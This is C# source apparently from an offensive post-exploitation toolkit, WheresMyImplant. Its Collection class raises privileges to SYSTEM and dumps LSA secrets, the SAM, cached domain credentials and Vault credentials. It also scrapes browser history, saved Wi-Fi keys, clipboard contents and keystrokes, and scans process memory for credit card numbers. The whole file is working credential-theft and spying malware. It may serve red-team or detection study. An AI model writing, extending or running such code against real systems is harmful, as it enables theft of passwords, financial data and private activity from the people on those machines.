using System;

using Tokenvator;

namespace WheresMyImplant
{
    public sealed class Collection
    {
        public static void DumpLsa()
        {
            try
            {
                CheckPrivileges checkSystem = new CheckPrivileges();
                if (!checkSystem.GetSystem())
                {
                    Console.WriteLine("[-] GetSystem Failed");
                    return;
                }
                LSASecrets lsaSecrets = new LSASecrets();
                lsaSecrets.DumpLSASecrets();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }

        public static void DumpSAM()
        {
            try
            {
                CheckPrivileges checkSystem = new CheckPrivileges();
                if (!checkSystem.GetSystem())
                {
                    Console.WriteLine("[-] GetSystem Failed");
                    return;
                }
                SAM sam = new SAM();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }

        public static void DumpDomainCache()
        {
            try
            {
                CheckPrivileges checkSystem = new CheckPrivileges();
                if (checkSystem.GetSystem())
                {
                    Console.WriteLine("[-] GetSystem Failed");
                    return;
                }
                CacheDump cacheDump = new CacheDump();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }

        public static void DumpVault()
        {
            try
            {
                Vault vault = new Vault();
                vault.EnumerateCredentials();

                CheckPrivileges checkSystem = new CheckPrivileges();
                if (!checkSystem.GetSystem())
                {
                    Console.WriteLine("[-] GetSystem Failed");
                    return;
                }
                vault = new Vault();
                vault.EnumerateCredentials();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }

        public static void DumpVaultCLI()
        {
            try
            {
                VaultCLI vault = new VaultCLI();
                vault.EnumerateVaults();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }

        public static void DumpBrowserHistory()
        {
            try
            {
                BrowserHistory history = new BrowserHistory();
                history.InternetExplorer();
                history.Firefox();
                history.Chrome();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }

        public static void ReadProcessMemory(String processId)
        {
            try
            { 
                if (!Int32.TryParse(processId, out Int32 pid))
                    Console.WriteLine("[-] Unable to parse {0}", processId);

                ReadProcessMemory readProcessMemory = new ReadProcessMemory(pid);
                if (!readProcessMemory.OpenProcess())
                    Console.WriteLine("[-] Unable to open process", pid);

                readProcessMemory.ReadProcesMemory();
                Console.WriteLine("\n-----\n");
                CheckCCNumber(readProcessMemory.GetPrintableMemory());
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }

        public static void CheckCCNumber(String input)
        {
            foreach (String number in CheckCreditCard.CheckString(input))
            {
                Console.WriteLine(number);
            }
        }

        public static void MiniDump(String processId, String fileName)
        {
            try
            {
                if (!Int32.TryParse(processId, out Int32 pid))
                    Console.WriteLine("[-] Unable to parse {0}", processId);

                MiniDumpWriteDump miniDump = new MiniDumpWriteDump();
                miniDump.CreateMiniDump((UInt32)pid, fileName);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }

        public static void Clipboard()
        {
            try
            {
                ClipboardManaged clipboard = new ClipboardManaged();
                clipboard.Execute();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }

        public static void Keylogger()
        {
            try
            {
                KeyLogger clipboard = new KeyLogger();
                clipboard.Execute();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }

        public static void WirelessPreSharedKey()
        {
            try
            {
                WirelessProfiles wp = new WirelessProfiles();
                wp.GetProfiles();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }
    }
}
